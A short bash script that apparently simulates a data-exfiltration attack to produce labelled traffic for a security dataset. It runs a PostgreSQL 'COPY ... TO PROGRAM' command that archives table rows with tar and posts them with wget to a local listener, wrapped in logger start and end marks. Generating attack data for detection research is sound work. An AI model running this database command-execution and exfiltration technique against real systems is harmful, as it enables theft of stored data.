#!/bin/bash
cd "$(dirname "${BASH_SOURCE[0]}")"
source ./_identity_lib.sh
casce_new_identity
echo "  identity=${CASCE_USER}@${CASCE_IP}"
echo "Simulating Data Exfiltration Attack (tar + wget)..."
/dataset_workspace/logger.sh mark_attack "attack_exfil_tar_wget" start
psql -U postgres -d casce_tpcb -c "$(casce_sql_prelude)COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'tar -czf /tmp/exfil_tar_wget.dat - && wget -q --post-file=/tmp/exfil_tar_wget.dat http://127.0.0.1:9090 2>/dev/null || true';"
/dataset_workspace/logger.sh mark_attack "attack_exfil_tar_wget" end
